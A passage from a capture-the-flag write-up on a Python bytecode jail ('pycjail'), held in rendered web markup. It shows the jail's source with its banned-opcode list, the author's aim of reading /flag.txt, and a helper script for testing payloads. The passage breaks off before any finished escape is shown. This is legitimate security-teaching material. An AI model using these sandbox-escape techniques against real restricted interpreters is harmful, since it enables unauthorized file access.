code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#!/usr/local/bin/python3\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` opcode\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` inspect\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"f\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"pass\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"banned \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"IMPORT_NAME\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"MAKE_FUNCTION\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" opcode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"opmap\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"LOAD\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"and\"}),\" k \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"LOAD_CONST\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"STORE\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` k\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"DELETE\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` k\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"JUMP\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` k\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        banned\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"append\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"k\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"banned \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"opcode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"opmap\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"x\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" x \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" banned\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"consts \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"tuple\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"consts: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\",\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"names \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"tuple\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"names: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\",\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"code \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"bytes\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"fromhex\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"code: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"consts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"too many consts \u003e:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"names\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"too many names \u003e:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"30\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"too much code \u003e:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"%\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"invalid code \u003e:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"any\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" banned \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"range\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"banned opcode \u003e:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"any\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"range\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"I never learned how to count past 3 \u003e:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"else\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"__code__ \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"__code__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"replace\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_stacksize\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_consts\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"consts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_names\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"names\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_code\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"here goes!\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    frame \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" inspect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"currentframe\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    r \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"repr\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"list\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"frame\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"f_globals\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"p\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"r\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"f\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"del\"}),\" frame\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"f_globals\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"k\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"To summarize the code above, you provided the \",(0,e.jsx)(n.code,{children:\"co_consts\"}),\", \",(0,e.jsx)(n.code,{children:\"co_names\"}),\", and \",(0,e.jsx)(n.code,{children:\"co_code\"}),\" bytes for a custom \",(0,e.jsx)(n.code,{children:\"code\"}),\" object that was created and ran. The restrictions imposed were:\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"max 3 consts\"}),`\n`,(0,e.jsx)(n.li,{children:\"max 4 names\"}),`\n`,(0,e.jsx)(n.li,{children:\"max 15 opcodes\"}),`\n`,(0,e.jsxs)(n.li,{children:[\"opcodes can\\u2019t be in \",(0,e.jsx)(n.code,{children:\"['IMPORT_NAME', 'MAKE_FUNCTION', 'STORE_SUBSCR', 'DELETE_SUBSCR', 'LOAD_BUILD_CLASS', 'LOAD_ASSERTION_ERROR', 'STORE_NAME', 'DELETE_NAME', 'STORE_ATTR', 'DELETE_ATTR', 'STORE_GLOBAL', 'DELETE_GLOBAL', 'LOAD_NAME', 'LOAD_ATTR', 'JUMP_FORWARD', 'JUMP_IF_FALSE_OR_POP', 'JUMP_IF_TRUE_OR_POP', 'JUMP_ABSOLUTE', 'POP_JUMP_IF_FALSE', 'POP_JUMP_IF_TRUE', 'LOAD_GLOBAL', 'JUMP_IF_NOT_EXC_MATCH', 'LOAD_FAST', 'STORE_FAST', 'DELETE_FAST', 'LOAD_CLOSURE', 'LOAD_DEREF', 'STORE_DEREF', 'DELETE_DEREF', 'LOAD_CLASSDEREF', 'LOAD_METHOD']\"}),\" (aka no import/makefunc/load/store/delete/jump)\"]}),`\n`,(0,e.jsx)(n.li,{children:\"opcode values can\\u2019t be \u003e 3\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Nothing about the flag was mentioned, so it was likely in \",(0,e.jsx)(n.code,{children:\"/flag.txt\"}),\" or \",(0,e.jsx)(n.code,{children:\"./flag.txt\"}),\", or if they were evil they\\u2019d require you to get RCE to read the flag. I was banking on the fact that it was stored in \",(0,e.jsx)(n.code,{children:\"/flag.txt\"}),\" or \",(0,e.jsx)(n.code,{children:\"./flag.txt\"}),\", so my goal was to get arbitrary read.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"approaching-the-problem\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#approaching-the-problem\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Approaching the Problem\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"I made a \",(0,e.jsx)(n.a,{href:\"https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/allowed.txt\",children:\"list\"}),\" of all the Python 3.10 opcodes that \",(0,e.jsx)(n.em,{children:\"were\"}),\" allowed in this jail by pulling from \",(0,e.jsx)(n.a,{href:\"https://docs.python.org/3.10/library/dis.html\",children:\"the documentation\"}),\" and removing the opcodes banned in the list above. What caught my eye initially was that the opcodes \",(0,e.jsx)(n.code,{children:\"CALL_FUNCTION\"}),\" and \",(0,e.jsx)(n.code,{children:\"CALL_METHOD\"}),\" were \",(0,e.jsx)(n.strong,{children:\"not\"}),\" banned, and this is what allows you to call a function on the stack. However, the hard part was \",(0,e.jsx)(n.em,{children:\"getting\"}),\" a callable object on the stack in the first place. The opcodes \",(0,e.jsx)(n.code,{children:\"LOAD_GLOBAL\"}),\", \",(0,e.jsx)(n.code,{children:\"LOAD_NAME\"}),\", \",(0,e.jsx)(n.code,{children:\"LOAD_METHOD\"}),\", and \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\" are typically used to get a function on the stack, and all \",(0,e.jsx)(n.code,{children:\"LOAD\"}),\" opcodes were blocked except for \",(0,e.jsx)(n.code,{children:\"LOAD_CONST\"}),\" (which only allowed us to put strings on the stack). As an example, below shows the bytecode for the line \",(0,e.jsx)(n.code,{children:'open(\"flag.txt\").read()'}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\u003e\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" dis\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"dis\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"compile\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`'open(\"flag.txt\").read()'`}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'pycjail'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'eval'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\"           \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" LOAD_NAME                \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\" LOAD_CONST               \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'flag.txt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),\" CALL_FUNCTION            \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"6\"}),\" LOAD_METHOD              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\" CALL_METHOD              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"             \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),` RETURN_VALUE\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"To test various payloads with the provided \",(0,e.jsx)(n.code,{children:\"main.py\"}),\" script, I created this small script to give me the info I want:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"language-python3 code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`import dis\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code_str = 'print(\"a\")'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code = compile(code_str, '\u003cstring\u003e', 'exec')\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`dis.dis(code)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`print(\"\\\\nconsts: \", code.co_consts)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`print(\"names: \", code.co_names)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`print(\"code: \", code.co_code.hex())\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Based on the provided \",(0,e.jsx)(n.code,{children:\"code_str\"}),\", it would show me a disassembly of the code, along with \",(0,e.jsx)(n.code,{children:\"co_consts\"}),\", \",(0,e.jsx)(n.code,{children:\"co_names\"}),\", and \",(0,e.jsx)(n.code,{children:\"co_code\"}),\" in the form desired.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now that I was set up to try stuff, I went through the Python bytecode documentation, opcode by opcode, trying to see if there was anything that would put a callable on the stack. Many of the opcodes were eliminated from the start, such as \",(0,e.jsx)(n.code,{children:\"BINARY_*\"}),\", \",(0,e.jsx)(n.code,{children:\"UNARY_*\"}),\", 